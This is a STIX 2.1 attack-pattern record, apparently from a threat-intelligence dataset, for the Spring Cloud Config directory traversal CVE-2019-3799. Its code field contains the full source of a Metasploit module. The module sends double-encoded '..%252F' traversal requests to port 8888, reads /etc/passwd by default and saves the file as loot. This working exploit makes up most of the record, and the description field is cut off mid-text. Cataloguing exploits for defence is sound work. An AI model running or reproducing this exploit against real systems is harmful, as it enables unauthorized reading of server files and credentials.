{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7be6c63e-761b-4569-a1ec-db82658afcd0",
    "created": "2024-08-14T16:30:19.532299Z",
    "modified": "2024-08-14T16:30:19.532303Z",
    "name": "Spring Cloud Config Server Directory Traversal",
    "description": " This module exploits an unauthenticated directory traversal vulnerability which exists in Spring Cloud Config versions 2.1.x prior to 2.1.2 versions 2.0.x prior to 2.0.4, and versions 1.4.x prior to 1.4.6. Spring Cloud Config listens by default on port 8888.  'References'  => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/springcloud_traversal.rb",
            "external_id": "springcloud_traversal.rb"
        },
        {
            "source_name": "reference",
            "url": "https://pivotal.io/security/cve-2019-3799"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Spring Cloud Config Server Directory Traversal',\n      'Description' => %q{\n        This module exploits an unauthenticated directory traversal vulnerability\n        which exists in Spring Cloud Config versions 2.1.x prior to 2.1.2,\n        versions 2.0.x prior to 2.0.4, and versions 1.4.x prior to 1.4.6. Spring\n        Cloud Config listens by default on port 8888.\n      },\n      'References'  =>\n        [\n          ['CVE', '2019-3799'],\n          ['URL', 'https://pivotal.io/security/cve-2019-3799']\n        ],\n      'Author'      =>\n        [\n          'Vern', # Vulnerability discovery\n          'Dhiraj Mishra' # Metasploit module\n        ],\n      'DisclosureDate' => '2019-04-17',\n      'License'        => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(8888),\n        OptString.new('FILEPATH', [true, \"The path to the file to read\", '/etc/passwd']),\n        OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 13 ])\n      ])\n  end\n\n  def data\n    Rex::Text.rand_text_alpha(3..8)\n  end\n\n  def run_host(ip)\n    filename = datastore['FILEPATH']\n    traversal = \"#{\"..%252F\" * datastore['DEPTH']}#{filename}\"\n    uri = \"/#{data}/#{data}/master/#{traversal}\"\n\n    res = send_request_raw({\n      'method' => 'GET',\n      'uri'    => uri\n    })\n\n    unless res && res.code == 200\n      print_error('Nothing was downloaded')\n      return\n    end\n\n    vprint_good(\"#{peer} - #{res.body}\")\n    path = store_loot(\n      'springcloud.traversal',\n      'text/plain',\n      ip,\n      res.body,\n      filename\n    )\n    print_good(\"File saved in: #{path}\")\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2019-04-17"
}